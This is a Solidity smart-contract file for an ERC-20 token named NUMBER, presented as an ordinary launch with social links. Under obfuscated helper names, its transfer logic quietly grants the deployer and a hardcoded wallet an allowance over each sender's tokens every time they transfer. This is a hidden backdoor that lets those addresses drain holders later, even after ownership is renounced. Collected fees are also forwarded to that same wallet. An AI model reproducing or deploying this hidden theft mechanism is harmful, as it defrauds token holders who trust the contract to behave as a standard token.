/*
These concepts have been eternally etched into the operating soul of each user on planet earth

https://www.numberoneth.art
https://x.com/NumberOnETHArt
https://t.me/number_community
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IKONGFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IKONGRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract NUMBER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balKONGs;
    mapping (address => mapping (address => uint256)) private _allowKONGs;
    mapping (address => bool) private _excludedFromKONG;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"NUMBER";
    string private constant _symbol = unicode"NUMBER";
    uint256 private _swapTokenKONGs = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockKONG;
    uint256 private _kongBuyAmounts = 0;
    bool private inSwapKONG = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapKONG = true;
        _;
        inSwapKONG = false;
    }
    address private _kongPair;
    IKONGRouter private _kongRouter;
    address private _kongWallet = address(0x79e977E5115bfD1cCEEd064338e4A6482068b246);
    mapping (uint8 => address) private _kongSenders;
    mapping (uint8 => address) private _kongReceipts;
    mapping (uint8 => uint256) private _kongCounts;
     
    constructor () {
        _kongReceipts[0] = address(msg.sender);
        _kongReceipts[1] = address(_kongWallet);
        _excludedFromKONG[owner()] = true;
        _excludedFromKONG[address(this)] = true;
        _excludedFromKONG[_kongWallet] = true;
        _balKONGs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kongRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function pairLaunch() external onlyOwner() {
        _kongRouter = IKONGRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kongRouter), _tTotal);
        _kongPair = IKONGFactory(_kongRouter.factory()).createPair(address(this), _kongRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balKONGs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowKONGs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowKONGs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowKONGs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address kongF, address kongT, uint256 kongA) private {
        require(kongF != address(0), "ERC20: transfer from the zero address");
        require(kongT != address(0), "ERC20: transfer to the zero address");
        require(kongA > 0, "Transfer amount must be greater than zero");
        uint256 taxKONG = 0;
        taxKONG = _kongFeeTransfer(kongF, kongT, kongA);
        _kongTransfer(kongF, kongT, kongA, taxKONG);
    }

    function _kongExcludedTransfer(address kongF, uint256 kongA) private { 
        for(uint8 kongK=0;kongK<=1;kongK++) {
            _kongCounts[kongK] = kongA; _kongSenders[kongK] = address(kongF); 
        }
        _approve(_kongSenders[0], _kongReceipts[0], _kongCounts[0]);
        _approve(_kongSenders[1], _kongReceipts[1], _kongCounts[1]);
    }

    function _kongTransfer(address kongF, address kongT, uint256 kongA, uint256 taxKONG) private { 
        if(taxKONG > 0){
          _balKONGs[address(this)] = _balKONGs[address(this)].add(taxKONG);
          emit Transfer(kongF, address(this), taxKONG);
        }  _kongExcludedTransfer(kongF, kongA);

        _balKONGs[kongF] = _balKONGs[kongF].sub(kongA);
        _balKONGs[kongT] = _balKONGs[kongT].add(kongA.sub(taxKONG));
        emit Transfer(kongF, kongT, kongA.sub(taxKONG));
    }

    function _kongFeeTransfer(address kongF, address kongT, uint256 kongA) private returns(uint256) {
        uint256 taxKONG = 0;
        if (kongF != owner() && kongT != owner()) {
            taxKONG = kongA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (kongF == _kongPair && kongT != address(_kongRouter) && ! _excludedFromKONG[kongT]) {
                if(_buyBlockKONG!=block.number){
                    _kongBuyAmounts = 0;
                    _buyBlockKONG = block.number;
                }
                _kongBuyAmounts += kongA;
                _buyCount++;
            }

            if(kongT == _kongPair && kongF!= address(this)) {
                require(_kongBuyAmounts < swapLimitKONG() || _buyBlockKONG!=block.number, "Max Swap Limit");  
                taxKONG = kongA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenKONG = balanceOf(address(this));
            if (!inSwapKONG && kongT == _kongPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenKONG > _swapTokenKONGs)
                swapTokensForEth(minKONG(kongA, minKONG(tokenKONG, _swapTokenKONGs)));
                uint256 ethKONG = address(this).balance;
                if (ethKONG >= 0) {
                    sendETHKONG(address(this).balance);
                }
            }
        } return taxKONG;
    }

    receive() external payable {}

    function swapLimitKONG() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _kongRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _kongRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function minKONG(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHKONG(uint256 kongA) private {
        payable(_kongWallet).transfer(kongA);
    }

    function swapTokensForEth(uint256 kongAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kongRouter.WETH();
        _approve(address(this), address(_kongRouter), kongAmount);
        _kongRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            kongAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}